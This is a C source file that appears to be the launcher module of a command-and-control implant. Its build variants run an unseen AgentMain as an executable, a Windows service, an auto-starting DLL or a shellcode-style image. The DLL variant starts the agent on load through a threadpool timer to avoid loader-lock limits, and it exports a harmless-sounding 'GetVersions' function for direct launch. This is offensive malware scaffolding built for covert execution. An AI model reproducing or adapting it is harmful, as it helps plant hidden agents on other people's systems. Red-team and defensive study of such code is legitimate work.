#include "main.h"
#include "config.h"

#if defined(DEBUG)

int main()
{
    AgentMain();
    return 0;
}

#elif defined(BUILD_SVC)

SERVICE_STATUS        ServiceStatus = {0};
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

void ServiceMain(int argc, char** argv) 
{
    CHAR* SvcName = getServiceName();
    hStatus = RegisterServiceCtrlHandlerA(SvcName, (LPHANDLER_FUNCTION)ControlHandler);
    if( !hStatus )
        return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    AgentMain();

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request) 
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}

int main() 
{
    SERVICE_TABLE_ENTRYA ServiceTable[2];
    CHAR* SvcName = getServiceName();
    ServiceTable[0].lpServiceName = (LPSTR) SvcName;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcherA(ServiceTable);

    return 0;
}

#elif defined(BUILD_DLL)

#define _WIN32_WINNT 0x0600
#include <threadpoolapiset.h>

// Global synchronization primitives
static volatile LONG g_AgentInitialized = FALSE;
static volatile LONG g_LockInitialized = FALSE;
static CRITICAL_SECTION g_InitLock;

// Initialize critical section during DLL load
void InitializeSynchronization()
{
    if (InterlockedCompareExchange(&g_LockInitialized, TRUE, FALSE) == FALSE)
        InitializeCriticalSection(&g_InitLock);
}

// Internal function to run agent with proper synchronization
void run()
{
    // Initialize synchronization if needed
    InitializeSynchronization();

    // Attempt to acquire initialization ownership
    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        // Create agent thread without blocking
        HANDLE hThread = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
        if (hThread)
            CloseHandle(hThread); // Detach thread for asynchronous execution
        else
            InterlockedExchange(&g_AgentInitialized, FALSE); // Reset flag on failure to allow retry
    }
}

extern "C" __declspec(dllexport) void CALLBACK GetVersions(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    // Mark as directly called to prevent automatic execution
    InitializeSynchronization();

    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        HANDLE hThread = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE); // Wait for thread completion when called directly
            CloseHandle(hThread);
        }
    }
}

VOID CALLBACK InitializationCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
{
    // Execute initialization without loader lock constraints
    CloseThreadpoolTimer(Timer);
    run();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    {
        // Initialize synchronization on first load
        InitializeSynchronization();

        // Create scope block to contain variable declarations
        PTP_TIMER timer = CreateThreadpoolTimer(InitializationCallback, NULL, NULL);
        if (timer) {
            FILETIME dueTime = { 0 };
            SetThreadpoolTimer(timer, &dueTime, 0, 0);
        }
        break;
    }
    case DLL_PROCESS_DETACH:
        // Cleanup if loader allows
        if (!lpReserved && g_LockInitialized)
            DeleteCriticalSection(&g_InitLock);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

#elif defined(BUILD_SHELLCODE)

__declspec(dllexport) void GetVersions() {};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    AgentMain();
    return TRUE;
}
#else

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    AgentMain();
	return 0;
}

#endif
